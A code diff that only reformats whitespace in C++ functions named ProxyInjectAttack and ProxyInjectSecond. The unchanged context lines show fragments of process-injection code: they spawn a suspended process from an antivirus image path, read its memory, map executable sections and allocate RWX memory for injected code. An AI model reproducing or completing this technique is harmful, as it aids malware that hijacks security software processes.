@@ -33,20 +33,20 @@ bool ProxyInjectAttack (std::wstring av_image_path,std::wstring proc_name)
 	//Create Suspend AVimage process
 	//
 	if (CreateProcess((LPWSTR)av_image_path.c_str(), NULL, NULL, NULL, NULL,
-																CREATE_SUSPENDED,
-																NULL, NULL, &si, &pi))
+			  CREATE_SUSPENDED,
+			  NULL, NULL, &si, &pi))
 	{
 		//Query Information(PEB)from AVimage process
 		if (NT_SUCCESS(NtQueryInformationProcess(pi.hProcess,(PROCESSINFOCLASS)0,&pbi,
-												sizeof(PROCESS_BASIC_INFORMATION),NULL)))
+							sizeof(PROCESS_BASIC_INFORMATION),NULL)))
 		{
 			//Read ImageBase
 			if (ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase, 4, &nb_read) 
-																				&& nb_read == 4)
+					      && nb_read == 4)
 			{
 				//Read MZ-PE header
 				if (ReadProcessMemory(pi.hProcess,(LPCVOID)ImageBase, heap_addr, 0x500, &nb_read) 
-																				&& nb_read == 0x500)
+						      && nb_read == 0x500)
 				{	
 					EP_ = get_entrypoint((char *)heap_addr);
 					LPVOID lpMem;
@@ -57,7 +57,7 @@ bool ProxyInjectAttack (std::wstring av_image_path,std::wstring proc_name)
 					{
 						//Read image
 						if (ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase, lpMem, size, &nb_read) 
-																				&& nb_read == size)
+								     && nb_read == size)
 						{
 							LARGE_INTEGER a;
 							a.HighPart = 0;
@@ -71,8 +71,8 @@ bool ProxyInjectAttack (std::wstring av_image_path,std::wstring proc_name)
 								size2=size;
 								BaseAddress = (PVOID)0;
 								if (NT_SUCCESS(NtMapViewOfSection(hsect,GetCurrentProcess(),&BaseAddress, NULL, 
-																		NULL, NULL, &size2,(SECTION_INHERIT)1 ,
-																		NULL, PAGE_EXECUTE_READWRITE)))
+												  NULL, NULL, &size2,(SECTION_INHERIT)1 ,
+												  NULL, PAGE_EXECUTE_READWRITE)))
 								{
 									//Unmap section AV-image
 
@@ -133,8 +133,8 @@ bool ProxyInjectSecond(std::wstring av_image_path,std::wstring proc_name)
 	contextThread.ContextFlags=CONTEXT_FULL;
 
 	if (CreateProcess((LPWSTR)av_image_path.c_str(), NULL, NULL, NULL, NULL,
-																CREATE_SUSPENDED,
-																NULL, NULL, &si, &pi))
+			CREATE_SUSPENDED,
+			NULL, NULL, &si, &pi))
 	{
 		lpMem2 =VirtualAllocEx(pi.hProcess, NULL,sizeof(inject_code), MEM_COMMIT,PAGE_EXECUTE_READWRITE);
 		if(lpMem2)
